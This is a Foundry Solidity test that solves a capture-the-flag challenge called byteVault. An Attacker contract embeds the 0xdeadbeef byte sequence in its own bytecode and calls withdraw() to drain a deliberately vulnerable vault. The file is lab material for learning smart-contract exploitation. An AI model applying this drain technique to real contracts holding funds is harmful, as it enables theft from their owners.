// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./BytecodeVault.sol";

/// https://github.com/MetaTrustLabs/ctf/blob/master/byteVault/contracts/bytecodeVault.sol

/// @dev msg.sender != tx.origin
contract Attacker {
    BytecodeVault internal _vault;

    // If the length of the runtime code is not odd, then add one bytes (2 chars)
    bytes constant public DEAD_BEEF = hex"deadbeef";

    constructor(BytecodeVault vault_) {
        _vault = vault_;
    }

    receive() external payable {}

    function attack() public {
        // sequence: 0xdeadbeef
        // Any continuous 4 bytes of the code of attacker must equal to:
        // bytes1(uint8(sequence >> 24)) = 0xde (222)
        // bytes1(uint8((sequence >> 16) & 0xFF)) = 0xad (173)
        // bytes1(uint8((sequence >> 8) & 0xFF)) = 0xbe (190)
        // bytes1(uint8(sequence & 0xFF)) = 0xef (239)
        //
        // code length must be odd
        _vault.withdraw();
    }
}

contract ByteVaultTest is Test {
    BytecodeVault internal _vault;

    function setUp() public {
        _vault = new BytecodeVault{value: 1e18}();
    }

    function test_attack() public {
        Attacker attacker = new Attacker(_vault);
        attacker.attack();

        assertTrue(_vault.isSolved());
    }
}
